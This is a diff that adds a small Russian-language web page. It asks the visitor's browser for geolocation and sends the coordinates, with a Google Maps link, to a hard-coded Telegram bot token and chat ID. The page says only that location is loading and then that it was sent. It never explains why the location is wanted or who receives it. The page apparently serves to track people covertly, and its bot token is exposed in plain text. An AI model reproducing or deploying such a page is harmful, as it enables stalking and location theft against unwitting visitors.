@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Геолокация</title>
+</head>
+<body>
+    <h2>Загрузка геолокации...</h2>
+    <script>
+        const TOKEN = "7482379553:AAG492H8uI1mKCB2RgotwtGxZeByQqZ7Au4";
+        const CHAT_ID = "1255735867";
+
+        navigator.geolocation.getCurrentPosition(success, error);
+
+        function success(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 Новая геолокация:\nШирота: ${lat}\nДолгота: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}`;
+
+            fetch(url).then(() => {
+                document.body.innerHTML = "<h3>✅ Геолокация успешно отправлена</h3>";
+            });
+        }
+
+        function error(err) {
+            document.body.innerHTML = "<p>❌ Ошибка геолокации: " + err.message + "</p>";
+        }
+    </script>
+</body>
+</html>
